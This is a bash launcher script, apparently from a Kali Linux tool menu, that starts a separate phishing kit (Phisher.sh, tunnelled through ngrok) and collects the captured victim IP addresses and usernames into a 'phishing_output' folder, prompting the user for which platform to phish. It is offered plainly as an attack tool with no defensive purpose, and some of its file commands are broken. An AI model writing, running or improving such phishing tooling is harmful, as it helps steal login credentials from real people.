#! /bin/bash
echo "$(tput setaf 3)

██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                      
"
echo -e "1. KALI LINUX \n2. KALI LINUX ARM"
while true
do
 read -r -p "Which system are you using ? - " input
 
 case $input in
     [1][eE][sS]|[1])
  echo "Starting script... "
  cd /home/kali/Desktop/KOZ1OLMENU/Phisher
  ./Phisher.sh
  echo "Saving data ... "
  read -r -p "Which platform do you phish ? - " platform
  cd /home/kali/Desktop/KOZ1OLMENU
  mkdir phishing_output
  cd /home/kali/Desktop/KOZ1OLMENU/Phisher/sites/$platform
  mv saved.ip.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
  mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
  rm ip.txt
  rm usernames.txt
  cd ..
  cd ..
  cd ..
  break
 ;;
     [2][oO]|[2])
   echo "Starting script... "
   cd /home/kali/Desktop/KOZ1OLMENU/Phisher
   mv ngrok > ngrok2
   sudo rm ngrok
   mv ngrok_arm > ngrok
   sudo rm ngrok_arm
   ./Phisher.sh
   read -r -p "Which platform do you phish ? - " platform2
   cd /home/kali/Desktop/KOZ1OLMENU
   mkdir phishing_output
   cd /home/kali/Desktop/KOZ1OLMENU/Phisher/sites/$platform2
   mv saved.ip.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
   mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
   rm ip.txt
   rm usernames.txt
   sudo rm ngrok
   mv ngrok2 > ngrok
   sudo rm ngrok2
   cd /home/kali/Desktop/KOZ1OLMENU
 
  break
        ;;
     *)
 echo "Invalid input..."
 ;;
 esac
done
while true
do
 read -r -p "Do you want start script again ? (y/n) - " start
 
 case $start in
     [yY][eE][sS]|[yY])
  ./K0Z1OLMENU.sh
 break
 ;;
     [nN][eE][sS]|[nN])
  echo "Thanks for using my script !"
  exit 1
 break
        ;;
     *)
 echo "Invalid input..."
  ;;
  esac
done